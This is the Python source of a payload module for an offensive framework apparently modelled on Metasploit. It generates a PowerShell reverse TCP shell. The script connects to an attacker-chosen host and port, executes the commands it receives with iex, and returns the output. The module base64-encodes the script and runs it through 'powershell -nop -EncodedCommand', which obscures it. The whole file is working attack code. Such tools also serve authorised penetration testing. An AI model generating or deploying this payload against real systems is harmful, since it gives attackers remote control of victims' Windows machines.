from kittysploit import *
import base64


class Module(Payload):
	
	__info__ = {
		'name': 'PowerShell Command Shell, Reverse TCP',
		'description': 'Connect back and create a command shell via PowerShell',
		'category': PayloadCategory.SINGLE,
		'arch': Arch.OTHER,  # PowerShell is interpreted, not architecture-specific
		'platform': Platform.WINDOWS,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE,
		'session_type': SessionType.SHELL
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	encoder = OptString("", "Encoder", False, True)

	def generate(self):
		"""Generate PowerShell reverse TCP payload using base64 encoding for reliability"""
		# PowerShell reverse shell script (without quotes/escaping issues)
		powershell_script = f"$c=New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+($pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()}};$c.Close()"
		
		# Encode to base64 for reliable execution (avoids escaping issues)
		encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode('utf-8')
		
		# Use -EncodedCommand for base64 or -Command for direct execution
		# Base64 encoding is more reliable for complex commands
		powershell_cmd = f"powershell -nop -EncodedCommand {encoded_script}"
		
		return powershell_cmd
